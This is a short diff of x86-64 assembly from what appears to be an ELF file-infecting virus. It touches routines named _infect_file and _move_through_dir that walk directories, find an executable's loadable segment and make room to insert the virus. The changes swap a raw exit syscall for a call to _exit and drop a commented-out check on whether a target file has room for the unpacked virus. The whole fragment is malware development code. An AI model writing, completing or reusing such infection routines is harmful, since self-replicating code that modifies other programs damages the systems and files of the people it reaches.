@@ -418,12 +418,7 @@ _i_am_root:
 
 	add rsp, 32
 
-	push 0
-	pop rdi
-	push 60
-	pop rax
-	syscall
-ret
+	call _exit
 %endif
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
@@ -658,7 +653,6 @@ _infect_file: ; (string rdi, stat rsi)
 
 	.is_elf_file:
 		; TODO: do 32 bits version (new compilation ?)
-
 		; get pt_load exec
 		mov ax, [r13 + E_PHNUM]; e_phnum
 		mov rbx, r13
@@ -700,16 +694,6 @@ _infect_file: ; (string rdi, stat rsi)
 			sub rsi, rdi
 
 			add rdi, 8 * 3 ; let space for params
-
-;			lea r9, [rel _params]
-;			lea rax, [rel _eof]
-;			sub rax, r9
-;			mov r9, [r12 + ST_SIZE]; statbuf.st_size
-;			sub r9, rdi
-			; check not enough size
-			; (file_size - (p_offset + p_filesz) < unpacked virus size)
-;			cmp r9, rax
-;			jl .unmap
 
 			add rdi, r13 ; addr pointer -> mmap
 
